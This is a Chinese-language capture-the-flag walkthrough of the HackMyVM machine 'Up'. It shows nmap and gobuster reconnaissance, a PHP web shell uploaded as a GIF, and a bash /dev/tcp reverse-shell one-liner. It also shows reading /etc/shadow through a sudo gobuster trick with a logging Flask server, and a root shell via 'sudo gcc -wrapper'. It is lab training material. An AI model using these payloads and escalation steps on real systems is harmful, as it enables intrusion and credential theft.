{"pageProps":{"postData":{"id":"HackMyVMUp","contentHtml":"<h1>Up.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Up\">https://hackmyvm.eu/machines/machine.php?vm=Up</a></p>\n</blockquote>\n<p>Notes: <strong>Enjoy.</strong></p>\n<h2>前期踩点</h2>\n<p><code>31</code>是靶机</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sP 192.168.56.0/24                   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:17 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00034s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00028s latency).\nMAC Address: 08:00:27:44:BF:0B (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.31\nHost is up (0.00051s latency).\nMAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 192.168.56.31  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:18 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.31\nHost is up (0.00085s latency).\nNot shown: 65534 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 17.22 seconds\n</code></pre>\n<p>这次<code>UDP</code>竟然扫出来东西了，<code>mDNS</code>（Multicast DNS）的默认端口，通常用于 DNS 服务发现</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sU -min-rate 10000 -p- 192.168.56.31 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:19 EST\nWarning: 192.168.56.31 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.31\nHost is up (0.00090s latency).\nNot shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)\nPORT     STATE SERVICE\n5353/udp open  zeroconf\nMAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 86.07 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sT -A -T4 -O -p 80 192.168.56.31 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:21 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.31\nHost is up (0.00060s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: RodGar - Subir Imagen\nMAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.60 ms 192.168.56.31\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 21.56 seconds\n</code></pre>\n<p>可以看到目标主机还报告了 <strong><code>80/tcp</code></strong> 上有 <code>HTTP</code> 服务</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sU -A -T4 -O -p 5353 192.168.56.31\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:22 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.31\nHost is up (0.00069s latency).\n\nPORT     STATE SERVICE VERSION\n5353/udp open  mdns    DNS-based service discovery\n| dns-service-discovery: \n|   80/tcp http\n|_    Address=192.168.56.31 fe80::a00:27ff:fe1e:6021\nMAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)\nToo many fingerprints match this host to give specific OS details\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.69 ms 192.168.56.31\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 15.35 seconds\n</code></pre>\n<p><code>nmap</code>漏洞扫描，扫描出了<code>file-upload</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -script=vuln -p 80 192.168.56.31 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:23 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.31\nHost is up (0.00034s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n| http-fileupload-exploiter: \n|   \n|_    Failed to upload and execute a payload.\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.31\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://192.168.56.31:80/\n|     Form <span class=\"hljs-built_in\">id</span>: file-upload\n|_    Form action: \n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.\nMAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<p>访问<code>http</code>服务，并检测指纹信息，主页貌似是文件上传功能点</p>\n<p><img src=\"/post-images/HackMyVMUp/image105.png\" alt=\"image.png\"></p>\n<h2>文件上传漏洞检测</h2>\n<p>正常上传照片正常上传的，但是响应包没给出上传路径</p>\n<p><img src=\"/post-images/HackMyVMUp/image106.png\" alt=\"image.png\"></p>\n<p>前端有文件后缀限制</p>\n<pre><code class=\"hljs language-bash\">&#x3C;input <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">\"file-upload\"</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"file\"</span> name=<span class=\"hljs-string\">\"image\"</span> accept=<span class=\"hljs-string\">\".jpg, .jpeg, .gif\"</span> required>\n</code></pre>\n<p>先扫一下目录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  gobuster <span class=\"hljs-built_in\">dir</span> -u 192.168.56.31 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,zip,txt,html -b 403,404,502    \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.31\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt\n[+] Negative Status codes:   403,404,502\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip,txt,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 4489]\n/uploads              (Status: 301) [Size: 316] [--> http://192.168.56.31/uploads/]\n/javascript           (Status: 301) [Size: 319] [--> http://192.168.56.31/javascript/]\n</code></pre>\n<p>能扫描到<code>uploads</code>文件夹，很可能是文件上传的地方，访问一下</p>\n<p><img src=\"/post-images/HackMyVMUp/image107.png\" alt=\"image.png\"></p>\n<p>给了一句话，翻译过来就是：<code>记住，列出所有事项始终是一个好的做法。</code></p>\n<p>不明所以，再给你爆一次</p>\n<pre><code class=\"hljs language-less\">⚡ <span class=\"hljs-selector-tag\">root</span>@<span class=\"hljs-selector-tag\">kali</span>  ~  <span class=\"hljs-selector-tag\">gobuster</span> <span class=\"hljs-selector-tag\">dir</span> <span class=\"hljs-selector-tag\">-u</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-selector-class\">.56</span><span class=\"hljs-selector-class\">.31</span>/<span class=\"hljs-selector-tag\">uploads</span> <span class=\"hljs-selector-tag\">-w</span> /<span class=\"hljs-selector-tag\">usr</span>/<span class=\"hljs-selector-tag\">share</span>/<span class=\"hljs-selector-tag\">wordlists</span>/<span class=\"hljs-selector-tag\">dirbuster</span>/<span class=\"hljs-selector-tag\">directory-list-lowercase-2</span><span class=\"hljs-selector-class\">.3-medium</span><span class=\"hljs-selector-class\">.txt</span> <span class=\"hljs-selector-tag\">-x</span> <span class=\"hljs-selector-tag\">php</span>,<span class=\"hljs-selector-tag\">zip</span>,<span class=\"hljs-selector-tag\">txt</span>,<span class=\"hljs-selector-tag\">html</span> <span class=\"hljs-selector-tag\">-b</span> <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span>,<span class=\"hljs-number\">502</span>\n===============================================================\n<span class=\"hljs-selector-tag\">Gobuster</span> <span class=\"hljs-selector-tag\">v3</span><span class=\"hljs-selector-class\">.6</span>\n<span class=\"hljs-selector-tag\">by</span> <span class=\"hljs-selector-tag\">OJ</span> <span class=\"hljs-selector-tag\">Reeves</span> (<span class=\"hljs-variable\">@TheColonial</span>) <span class=\"hljs-selector-tag\">&#x26;</span> <span class=\"hljs-selector-tag\">Christian</span> <span class=\"hljs-selector-tag\">Mehlmauer</span> (<span class=\"hljs-variable\">@firefart</span>)\n===============================================================\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Url</span>:                     <span class=\"hljs-selector-tag\">http</span>:<span class=\"hljs-comment\">//192.168.56.31/uploads</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Method</span>:                  <span class=\"hljs-selector-tag\">GET</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Threads</span>:                 <span class=\"hljs-number\">10</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Wordlist</span>:                /<span class=\"hljs-selector-tag\">usr</span>/<span class=\"hljs-selector-tag\">share</span>/<span class=\"hljs-selector-tag\">wordlists</span>/<span class=\"hljs-selector-tag\">dirbuster</span>/<span class=\"hljs-selector-tag\">directory-list-lowercase-2</span><span class=\"hljs-selector-class\">.3-medium</span><span class=\"hljs-selector-class\">.txt</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Negative</span> <span class=\"hljs-selector-tag\">Status</span> <span class=\"hljs-selector-tag\">codes</span>:   <span class=\"hljs-number\">404</span>,<span class=\"hljs-number\">502</span>,<span class=\"hljs-number\">403</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">User</span> <span class=\"hljs-selector-tag\">Agent</span>:              <span class=\"hljs-selector-tag\">gobuster</span>/<span class=\"hljs-number\">3.6</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Extensions</span>:              <span class=\"hljs-selector-tag\">php</span>,<span class=\"hljs-selector-tag\">zip</span>,<span class=\"hljs-selector-tag\">txt</span>,<span class=\"hljs-selector-tag\">html</span>\n<span class=\"hljs-selector-attr\">[+]</span> <span class=\"hljs-selector-tag\">Timeout</span>:                 <span class=\"hljs-number\">10s</span>\n===============================================================\n<span class=\"hljs-selector-tag\">Starting</span> <span class=\"hljs-selector-tag\">gobuster</span> <span class=\"hljs-selector-tag\">in</span> <span class=\"hljs-selector-tag\">directory</span> <span class=\"hljs-selector-tag\">enumeration</span> <span class=\"hljs-selector-tag\">mode</span>\n===============================================================\n/<span class=\"hljs-selector-tag\">robots</span><span class=\"hljs-selector-class\">.txt</span>           (<span class=\"hljs-attribute\">Status</span>: <span class=\"hljs-number\">200</span>) <span class=\"hljs-selector-attr\">[Size: 1301]</span>\n/<span class=\"hljs-selector-tag\">clue</span><span class=\"hljs-selector-class\">.txt</span>             (<span class=\"hljs-attribute\">Status</span>: <span class=\"hljs-number\">200</span>) <span class=\"hljs-selector-attr\">[Size: 17]</span>\n<span class=\"hljs-selector-tag\">Progress</span>: <span class=\"hljs-number\">1038215</span> / <span class=\"hljs-number\">1038220</span> (<span class=\"hljs-number\">100.00%</span>)\n===============================================================\n<span class=\"hljs-selector-tag\">Finished</span>\n===============================================================\n</code></pre>\n<p>扫出来两个文件<code>/robots.txt</code> <code>/clue.txt</code></p>\n<p><code>/robots.txt</code> 像一串<code>base64</code> 编码后的字符</p>\n<p><img src=\"/post-images/HackMyVMUp/image108.png\" alt=\"image.png\"></p>\n<p>解码，是上传源码，使用<code>php</code>写的</p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REQUEST_METHOD'</span>] === <span class=\"hljs-string\">'POST'</span>) {\n    <span class=\"hljs-variable\">$targetDir</span> = <span class=\"hljs-string\">\"uploads/\"</span>;\n    <span class=\"hljs-variable\">$fileName</span> = <span class=\"hljs-built_in\">basename</span>(<span class=\"hljs-variable\">$_FILES</span>[<span class=\"hljs-string\">\"image\"</span>][<span class=\"hljs-string\">\"name\"</span>]);\n    <span class=\"hljs-variable\">$fileType</span> = pathinfo(<span class=\"hljs-variable\">$fileName</span>, PATHINFO_EXTENSION);\n    <span class=\"hljs-variable\">$fileBaseName</span> = pathinfo(<span class=\"hljs-variable\">$fileName</span>, PATHINFO_FILENAME);\n\n    <span class=\"hljs-variable\">$allowedTypes</span> = [<span class=\"hljs-string\">'jpg'</span>, <span class=\"hljs-string\">'jpeg'</span>, <span class=\"hljs-string\">'gif'</span>];\n    <span class=\"hljs-keyword\">if</span> (in_array(strtolower(<span class=\"hljs-variable\">$fileType</span>), <span class=\"hljs-variable\">$allowedTypes</span>)) {\n        <span class=\"hljs-variable\">$encryptedFileName</span> = strtr(<span class=\"hljs-variable\">$fileBaseName</span>, \n            <span class=\"hljs-string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>, \n            <span class=\"hljs-string\">'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'</span>);\n\n        <span class=\"hljs-variable\">$newFileName</span> = <span class=\"hljs-variable\">$encryptedFileName</span> . <span class=\"hljs-string\">\".\"</span> . <span class=\"hljs-variable\">$fileType</span>;\n        <span class=\"hljs-variable\">$targetFilePath</span> = <span class=\"hljs-variable\">$targetDir</span> . <span class=\"hljs-variable\">$newFileName</span>;\n\n        <span class=\"hljs-keyword\">if</span> (move_uploaded_file(<span class=\"hljs-variable\">$_FILES</span>[<span class=\"hljs-string\">\"image\"</span>][<span class=\"hljs-string\">\"tmp_name\"</span>], <span class=\"hljs-variable\">$targetFilePath</span>)) {\n            <span class=\"hljs-variable\">$message</span> = <span class=\"hljs-string\">\"El archivo se ha subido correctamente.\"</span>;\n        } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-variable\">$message</span> = <span class=\"hljs-string\">\"Hubo un error al subir el archivo.\"</span>;\n        }\n    } <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-variable\">$message</span> = <span class=\"hljs-string\">\"Solo se permiten archivos JPG y GIF.\"</span>;\n    }\n}\n?>\n</code></pre>\n<p><code>/clue.txt</code> 给了条路径，不过访问不到，可能到提权的部分有用</p>\n<p><img src=\"/post-images/HackMyVMUp/image109.png\" alt=\"image.png\"></p>\n<p>拿到源码后分析一下，白名单限制设置允许上传的文件类型为 <code>jpg</code>、<code>jpeg</code> 和 <code>gif</code></p>\n<p>文件上传之后对文件名进行字符替换，上传到<code>uploads</code>文件夹</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$encryptedFileName</span> = strtr(<span class=\"hljs-variable\">$fileBaseName</span>, \n    <span class=\"hljs-string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>, \n    <span class=\"hljs-string\">'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'</span>);\n</code></pre>\n<p>我们上传<code>a.gif</code>，根据字符替换后就变成了<code>n.gif</code> ,访问<code>n.gif</code></p>\n<p><img src=\"/post-images/HackMyVMUp/image110.png\" alt=\"image.png\"></p>\n<p>成功访问到了，我们再上传一次，抓包修改抓包内容。添加<code>phpinfo()</code>语句</p>\n<p><img src=\"/post-images/HackMyVMUp/image111.png\" alt=\"image.png\"></p>\n<p>再次访问<code>n.gif</code> ,<code>phpinfo()</code>成功执行了，一般来说白名单绕过只能配合解析漏洞来绕过，但是这里直接执行成功了，估计是服务器配置不当导致的</p>\n<p><img src=\"/post-images/HackMyVMUp/image112.png\" alt=\"image.png\"></p>\n<h2>提权</h2>\n<p>将其替换为提权语句，<code>kali</code>开启监听，上传</p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php <span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/IP/PORT 0>&#x26;1'\"</span>);?>\n</code></pre>\n<p><img src=\"/post-images/HackMyVMUp/image113.png\" alt=\"image.png\"></p>\n<p>然后访问<code>n.gif</code> ，获得<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nc -lvp 4444                         \nlistening on [any] 4444 ...\n<span class=\"hljs-built_in\">id</span>\n192.168.56.31: inverse host lookup failed: Host name lookup failure\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.31] 50214\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (739): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nwww-data@debian:/var/www/html/uploads$ <span class=\"hljs-built_in\">id</span>\nuid=33(www-data) gid=33(www-data) <span class=\"hljs-built_in\">groups</span>=33(www-data)\nwww-data@debian:/var/www/html/uploads$ \n</code></pre>\n<p>在<code>rodgar</code>用户家目录可以找到<code>UserFlag</code></p>\n<pre><code class=\"hljs language-bash\">www-data@debian:/home/rodgar$ <span class=\"hljs-built_in\">cat</span> user.txt\nb45cffe084dd3d20d928bee\n</code></pre>\n<p>查看权限可以<code>root</code>权限执行<code>gobuster</code></p>\n<pre><code class=\"hljs language-bash\">www-data@debian:/home/rodgar$ <span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> www-data on debian:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser www-data may run the following commands on debian:\n    (ALL) NOPASSWD: /usr/bin/gobuster\n</code></pre>\n<p>那么就可以任意读取文件了，首先在<code>kali</code>使用<code>python</code>写一个简易服务器，将所有请求都保存在<code>access.txt</code>里</p>\n<pre><code class=\"hljs language-bash\">// a.py\nfrom flask import Flask, Response, request\n\napp = Flask(__name__)\n\n@app.route(<span class=\"hljs-string\">'/'</span>, defaults={<span class=\"hljs-string\">'path'</span>: <span class=\"hljs-string\">''</span>})\n@app.route(<span class=\"hljs-string\">'/&#x3C;path:path>'</span>)\n<span class=\"hljs-comment\"># catch_all 处理所有请求</span>\ndef catch_all(path):\n    <span class=\"hljs-comment\"># 获取请求的 URL 和路径</span>\n    url = request.url\n    path_info = path\n    \n    <span class=\"hljs-comment\"># 将 URL 和路径保存到 access.txt</span>\n    with open(<span class=\"hljs-string\">'access.txt'</span>, <span class=\"hljs-string\">'a'</span>) as f:\n        f.write(f<span class=\"hljs-string\">\"URL: {url}\\n\"</span>)\n        f.write(f<span class=\"hljs-string\">\"Path: {path_info}\\n\"</span>)\n        f.write(<span class=\"hljs-string\">\"-\"</span> * 50 + <span class=\"hljs-string\">\"\\n\"</span>)\n\n    <span class=\"hljs-comment\"># 根据路径的长度返回相应的状态码</span>\n    <span class=\"hljs-keyword\">if</span> len(path) == 31:\n        <span class=\"hljs-built_in\">return</span> Response(status=404)\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-built_in\">return</span> Response(status=200)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">'__main__'</span>:\n    app.run(host=<span class=\"hljs-string\">\"0.0.0.0\"</span>, port=81)\n</code></pre>\n<p><code>kali</code>开启服务器</p>\n<pre><code class=\"hljs language-bash\">python a.py\n</code></pre>\n<p>然后在靶机使用<code>gobuster</code>指定字典<code>/etc/shadow</code> ,执行</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sudo</span> gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.4:81 -w /etc/shadow --exclude-length 0\n</code></pre>\n<p>那么这样就能读取到<code>/etc/shadow</code>的文件夹了</p>\n<p><img src=\"/post-images/HackMyVMUp/image114.png\" alt=\"image.png\"></p>\n<p>接着尝试读取<code>/root/root.txt</code>文件</p>\n<pre><code class=\"hljs language-bash\">www-data@debian:/var/www/html/uploads$ <span class=\"hljs-built_in\">sudo</span> gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.4:81 -w /root/root.txt --exclude-length 0\n&#x3C;92.168.56.4:81 -w /root/root.txt --exclude-length 0\nError: error on parsing arguments: wordlist file <span class=\"hljs-string\">\"/root/root.txt\"</span> does not exist: <span class=\"hljs-built_in\">stat</span> /root/root.txt: no such file or directory\n</code></pre>\n<p>但是提示找不到该文件，想起来上面<code>web</code>的<code>/clue.txt</code> 给了条路经<code>/root/rodgarpass</code></p>\n<p>我们将其作为字典再来一次</p>\n<p><img src=\"/post-images/HackMyVMUp/image115.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">b45cffe084dd3d20d928bee85e7b0f2\n</code></pre>\n<p>进行<code>su</code>切换，发现认证错误，而且密码看着像是<code>MD5</code> ,进行<code>MD5</code>爆破</p>\n<p><img src=\"/post-images/HackMyVMUp/image116.png\" alt=\"image.png\"></p>\n<p>解出来为<code>string</code> ,再次<code>su</code> ，没登陆进去，经提示是作者疏忽<code>?</code>将<code>MD5</code>值最后少了个<code>1</code> （怪不得<code>john</code>无法破解）</p>\n<pre><code class=\"hljs language-bash\">b45cffe084dd3d20d928bee85e7b0f21\n</code></pre>\n<p>再次切换</p>\n<pre><code class=\"hljs language-bash\">www-data@debian:/home/rodgar$ su rodgar \nsu rodgar\nPassword: b45cffe084dd3d20d928bee85e7b0f21\n<span class=\"hljs-built_in\">id</span>\nuid=1001(rodgar) gid=1001(rodgar) grupos=1001(rodgar)\n</code></pre>\n<p>查看权限，欸嘿，可以直接提权了</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> rodgar on debian:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser rodgar may run the following commands on debian:\n    (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make\n</code></pre>\n<p><img src=\"/post-images/HackMyVMUp/image117.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sudo</span> gcc -wrapper /bin/sh,-s .\n<span class=\"hljs-built_in\">id</span>\nuid=0(root) gid=0(root) grupos=0(root)\n</code></pre>\n<p>读取<code>RootFlag</code> ，<code>root</code>.txt文件被改为了<code>rooo_-tt.txt</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> rooo_-tt.txt\n44b3f261e197124e60217d6ffe7e71a8e0175ae0\n</code></pre>","title":"HackMyVM - Up","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Up. https://hackmyvm.eu/machines/machine.php?vm=Up Notes: Enjoy. 前期踩点 31是靶机 这次UDP竟然扫出来东西了，mDNS（Multicast DNS）的默认端口，通常用于 DNS 服务发现 可以看到目标主机还报告了 80/tcp 上..."},"recentPosts":[{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"}]},"__N_SSG":true}